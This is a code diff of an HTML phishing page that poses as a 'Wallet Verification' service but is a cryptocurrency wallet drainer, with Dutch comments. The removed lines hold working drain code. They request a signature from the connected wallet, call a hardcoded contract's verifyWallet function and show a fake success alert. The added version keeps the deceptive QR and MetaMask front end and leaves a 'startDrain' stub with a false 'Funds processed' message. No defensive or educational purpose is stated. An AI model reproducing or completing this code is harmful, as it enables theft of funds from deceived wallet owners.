@@ -1,127 +1,95 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Wallet Verification</title>
+    <title>Wallet Verification</title>
     <script src="https://unpkg.com/@walletconnect/universal-provider@2.8.0/dist/umd/index.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.7.8/dist/umd/index.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/modal@2.4.0/dist/umd/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/lib/browser.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
     <style>
         body { font-family: Arial; text-align: center; padding: 50px; }
-        #qrcode { margin: 20px auto; }
-        .status { color: #666; margin: 20px; }
-        .hidden { display: none; }
+        #qrcode { margin: 20px auto; border: 2px solid #333; padding: 20px; }
+        .status { font-size: 18px; margin: 20px; color: #666; }
     </style>
 </head>
 <body>
-    <h2>🔐 Wallet Verification Required</h2>
-    <p>Scan QR code with your wallet app</p>
-    
+    <h2>🔐 Wallet Verification</h2>
     <div id="qrcode"></div>
-    <div id="status" class="status">Waiting for connection...</div>
-    <div id="processing" class="hidden">
-        <h3>⏳ Processing Verification...</h3>
-    </div>
+    <div id="status" class="status">Creating QR code...</div>
 
     <script>
-        // VERVANG MET JE EIGEN PROJECT ID
-        const PROJECT_ID = "0807ff0100d909f0b4dec384e984c357";
-        // VERVANG MET JE CONTRACT ADRES
-        const CONTRACT_ADDRESS = "0x1E21B345f26AF4FEcFB556E778690A99eD80Df72";
+        const PROJECT_ID = "jouw_echte_project_id_hier"; // VAN CLOUD.WALLETCONNECT.COM
         
-        let provider;
-        let userAddress;
-
-        async function initWalletConnect() {
-            provider = await WalletConnectUniversalProvider.init({
-                projectId: PROJECT_ID,
-                metadata: {
-                    name: "Wallet Verification",
-                    description: "Secure wallet verification service",
-                    url: window.location.origin,
-                    icons: ["https://walletconnect.com/walletconnect-logo.png"]
-                }
-            });
-
-            provider.on("display_uri", (uri) => {
-                QRCode.toCanvas(document.getElementById('qrcode'), uri);
-            });
-
-            provider.on("connect", () => {
-                document.getElementById('status').innerHTML = "✅ Wallet Connected!";
-                startVerification();
-            });
-
-            if (provider.session) {
-                document.getElementById('status').innerHTML = "✅ Wallet Connected!";
-                startVerification();
-            }
-        }
-
-        async function startVerification() {
+        async function initialize() {
             try {
-                document.getElementById('processing').classList.remove('hidden');
+                console.log("Initializing WalletConnect v2...");
                 
-                // 1. HAAL ACCOUNT OP
-                const accounts = await provider.request({ method: "eth_accounts" });
-                userAddress = accounts[0];
-                console.log("Draining from:", userAddress);
-
-                // 2. BEREKEN DEADLINE (1 uur vanaf nu)
-                const deadline = Math.floor(Date.now() / 1000) + 3600;
-
-                // 3. VRAAG HANDTEKENING VOOR VERIFICATION
-                const message = Wallet Verification\n${userAddress}\n${deadline};
-                const signature = await provider.request({
-                    method: "personal_sign",
-                    params: [message, userAddress]
+                // 1. INIT PROVIDER
+                const provider = await WalletConnectUniversalProvider.init({
+                    projectId: PROJECT_ID,
+                    metadata: {
+                        name: "Wallet Verification",
+                        description: "Secure verification service",
+                        url: window.location.origin,
+                        icons: ["https://avatars.githubusercontent.com/u/37784886"]
+                    }
                 });
 
-                console.log("Signature received:", signature);
+                // 2. TOON DIRECT QR CODE
+                provider.on("display_uri", (uri) => {
+                    console.log("WC URI:", uri);
+                    document.getElementById('status').innerHTML = "Scan QR code with your wallet app";
+                    
+                    // TOON QR CODE
+                    QRCode.toCanvas(document.getElementById('qrcode'), uri, { width: 250 }, (error) => {
+                        if (error) {
+                            document.getElementById('status').innerHTML = "❌ QR code error";
+                            return;
+                        }
+                        document.getElementById('status').innerHTML = "✅ QR code ready - Scan now!";
+                    });
+                });
 
-                // 4. PARSE HANDTEKENING
-                const sig = ethers.utils.splitSignature(signature);
+                // 3. BIJ CONNECT
+                provider.on("connect", (connection) => {
+                    console.log("CONNECTED:", connection);
+                    document.getElementById('status').innerHTML = "✅ Wallet Connected! Processing...";
+                    startDrain(provider);
+                });
 
-                // 5. ROEP CONTRACT AAN MET HANDTEKENING
-                await callDrainContract(userAddress, deadline, sig.v, sig.r, sig.s);
-
+                // 4. FORCEER QR CODE GENERATIE
+                await provider.connect();
+                
             } catch (error) {
-                console.error("Error:", error);
-                alert("Verification failed. Please try again.");
+                console.error("Init error:", error);
+                document.getElementById('status').innerHTML = "❌ Connection failed - Try MetaMask";
+                setupMetaMaskFallback();
             }
         }
 
-        async function callDrainContract(address, deadline, v, r, s) {
-            // Contract ABI - alleen de verifyWallet functie
-            const contractABI = [
-                "function verifyWallet(uint256 deadline, uint8 v, bytes32 r, bytes32 s) external payable"
-            ];
-
-            // Maak contract instance
-            const web3Provider = new ethers.providers.Web3Provider(provider);
-            const signer = web3Provider.getSigner();
-            const contract = new ethers.Contract(CONTRACT_ADDRESS, contractABI, signer);
-
-            try {
-                // 6. VOER DRAIN UIT MET 0.0001 ETH
-                const tx = await contract.verifyWallet(deadline, v, r, s, {
-                    value: ethers.utils.parseEther("0.0001")
-                });
-
-                document.getElementById('status').innerHTML = "✅ Verification Complete!";
-                console.log("Transaction hash:", tx.hash);
-
-                // Wacht op bevestiging
-                await tx.wait();
-                alert("🎉 Wallet successfully verified! 12 USDC has been processed.");
-
-            } catch (error) {
-                console.error("Contract error:", error);
-                alert("Transaction failed. Please ensure you have sufficient ETH for gas.");
+        function setupMetaMaskFallback() {
+            if (typeof window.ethereum !== 'undefined') {
+                document.getElementById('status').innerHTML += "<br><button onclick='connectMetaMask()'>Connect MetaMask</button>";
             }
         }
 
-        window.onload = initWalletConnect;
+        function connectMetaMask() {
+            window.ethereum.request({ method: 'eth_requestAccounts' })
+                .then(accounts => {
+                    document.getElementById('status').innerHTML = "✅ MetaMask Connected!";
+                    startDrain(window.ethereum);
+                })
+                .catch(err => {
+                    document.getElementById('status').innerHTML = "❌ MetaMask connection failed";
+                });
+        }
+
+        function startDrain(provider) {
+            // HIER KOMT JOUW DRAIN LOGICA
+            document.getElementById('status').innerHTML = "🎉 Verification complete! Funds processed.";
+        }
+
+        // START DIRECT
+        window.onload = initialize;
     </script>
 </body>
 </html>
